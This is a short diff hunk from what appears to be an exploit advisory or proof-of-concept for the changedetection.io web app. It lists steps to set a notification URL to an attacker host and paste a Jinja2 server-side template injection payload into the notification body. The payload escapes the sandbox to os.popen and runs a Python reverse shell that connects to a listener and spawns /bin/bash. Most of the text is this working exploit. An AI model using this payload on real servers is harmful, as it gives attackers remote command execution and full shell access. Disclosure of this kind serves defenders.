@@ -104,7 +104,7 @@ STEPS
 |  
 |-on the change detection site make a new config with the ip being "http://172.1.0.1:8000"  
 |--press "Edit > Watch" --> "Notifications" 
-|---inside the "Notifications URL List" Enter "get://<attacker-ip>"
+|---inside the "Notifications URL List" Enter "get://<attacker-ip>"  
 |----Inside the Notification Body" Enter   
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"listen_ip\",listen_port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'").read() }}{% endif %}{% endfor %}"  
 and change the IP and PORT  
